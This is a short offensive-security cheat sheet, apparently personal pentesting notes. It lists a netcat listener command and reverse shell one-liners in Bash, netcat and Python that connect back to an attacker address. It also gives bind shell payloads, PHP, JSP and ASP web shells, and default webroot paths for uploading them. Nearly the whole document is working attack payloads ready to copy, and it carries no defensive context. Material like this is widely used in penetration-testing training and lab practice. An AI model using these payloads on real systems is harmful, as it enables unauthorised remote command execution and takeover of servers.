**Category:** #Exploitation / #Payloads
**Scope:** Linux, Windows, & Web Servers

---

## 🎧 The Listener (Your Machine)

Before sending any payload, your "Ear" must be open.
```
# -l (listen), -v (verbose), -n (no DNS), -p (port)
nc -lvnp 1234
```

---

## 🚀 Reverse Shell Payloads (Target ➔ Us)

|**OS / Language**|**Command Payload**|
|---|---|
|**Linux (Bash)**|`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`|
|**Linux (Netcat)**|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`|
|**Python**|`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`|

---

## ⛓️ Bind Shell Payloads (Target Opens Port)

|**OS / Language**|**Command Payload**|
|---|---|
|**Linux (Bash)**|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`|
|**Python**|`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",1234));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn("/bin/bash")'`|

---

## 🌐 Web Shell One-Liners

Upload these scripts to the webroot to gain command execution via URL parameters.

- **PHP:** `<?php system($_REQUEST["cmd"]); ?>` → `?cmd=id`
    
- **JSP:** `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
    
- **ASP:** `<% eval request("cmd") %>`
    

### 📂 Target Webroot Locations

If you have file upload or write access, aim for these default paths:

- **Apache/Nginx (Linux):** `/var/www/html/`
    
- **Nginx (Alt):** `/usr/local/nginx/html/`
    
- **IIS (Windows):** `C:\inetpub\wwwroot\`